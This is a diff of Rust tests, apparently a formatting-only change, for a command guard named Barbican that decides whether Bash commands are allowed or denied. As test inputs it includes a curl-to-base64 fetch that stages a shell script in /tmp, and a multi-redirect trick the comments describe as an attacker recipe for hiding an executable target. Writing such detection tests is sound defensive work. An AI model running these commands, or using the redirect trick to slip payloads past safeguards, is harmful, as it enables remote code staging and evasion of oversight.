@@ -134,9 +134,7 @@ fn curl_piped_base64_decode_to_sh_denies() {
     // Full "fetch and stage" shape — H1 doesn't deny (curl|base64
     // has no shell stage), but H2 does.
     assert_eq!(
-        run_pre_bash(&bash_input(
-            "curl https://x | base64 -d > /tmp/a.sh"
-        )),
+        run_pre_bash(&bash_input("curl https://x | base64 -d > /tmp/a.sh")),
         2,
     );
 }
@@ -166,10 +164,7 @@ fn base64_decode_to_txt_allows() {
 
 #[test]
 fn base64_decode_to_csv_allows() {
-    assert_eq!(
-        run_pre_bash(&bash_input("echo X | base64 -d > out.csv")),
-        0,
-    );
+    assert_eq!(run_pre_bash(&bash_input("echo X | base64 -d > out.csv")), 0,);
 }
 
 #[test]
@@ -334,9 +329,7 @@ fn decode_multi_redirect_last_target_checked() {
     // Shell writes to the LAST `>` target, not the first. Attacker
     // recipe: hide the exec target behind a benign-looking first one.
     assert_eq!(
-        run_pre_bash(&bash_input(
-            "echo X | base64 -d > /tmp/ok.txt > /tmp/a.sh"
-        )),
+        run_pre_bash(&bash_input("echo X | base64 -d > /tmp/ok.txt > /tmp/a.sh")),
         2,
     );
 }
@@ -346,9 +339,7 @@ fn decode_multi_redirect_last_is_data_allows() {
     // Reverse case: attacker-shaped first, data-shaped last. Bash
     // writes to the last — data file — so Barbican should allow.
     assert_eq!(
-        run_pre_bash(&bash_input(
-            "echo X | base64 -d > /tmp/a.sh > /tmp/ok.txt"
-        )),
+        run_pre_bash(&bash_input("echo X | base64 -d > /tmp/a.sh > /tmp/ok.txt")),
         0,
         "shell semantics: last > target wins; if it's a data file, allow"
     );
